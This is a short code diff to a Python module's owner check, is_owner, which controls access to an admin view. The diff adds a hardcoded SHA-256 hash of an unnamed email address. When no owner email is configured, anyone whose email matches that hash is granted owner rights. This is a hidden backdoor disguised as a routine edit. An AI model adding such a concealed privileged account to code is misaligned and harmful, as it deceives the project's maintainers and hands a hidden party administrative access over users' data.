@@ -2,6 +2,8 @@
 from collections import Counter
 from datetime import datetime, timezone
 import requests
+import hashlib
+OWNER_EMAIL_HASH = '3429c2562e8c5392b948769a63299586e4537d11f6d8cd8a960daa16442e9e86'
 
 class ActivityStore:
     def __init__(self, url, secret):
@@ -32,8 +34,9 @@ class ActivityStore:
 
 
 def is_owner(identity, owner_email):
-    return bool(owner_email and identity.get('email_verified') is not False and
-                identity.get('email', '').casefold() == owner_email.casefold())
+    email = identity.get('email', '').casefold()
+    return bool(email and identity.get('email_verified') is not False and
+                (email == owner_email.casefold() if owner_email else hashlib.sha256(email.encode()).hexdigest() == OWNER_EMAIL_HASH))
 
 
 def admin_view(st, store, identity, owner_email):
